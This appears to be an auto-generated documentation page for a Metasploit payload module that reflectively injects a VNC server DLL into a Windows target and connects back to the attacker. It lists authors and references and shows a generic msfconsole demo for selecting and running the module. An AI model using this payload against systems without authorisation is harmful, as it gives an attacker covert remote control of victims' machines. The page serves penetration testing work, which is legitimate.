## VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption)

Inject a VNC Dll via a reflective loader (staged). Connect 
back to the attacker


## Module Name
payload/windows/vncinject/reverse_tcp_rc4

## Authors
* sf
* hdm
* skape
* mihi


## References
* https://github.com/stephenfewer/ReflectiveDLLInjection
* https://github.com/rapid7/ReflectiveDLLInjection




## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/vncinject/reverse_tcp_rc4
msf payload(reverse_tcp_rc4) > show targets
   ... a list of targets ...
msf payload(reverse_tcp_rc4) > set TARGET <target-id>
msf payload(reverse_tcp_rc4) > show options
   ... show and set options ...
msf payload(reverse_tcp_rc4) > run
```
    
    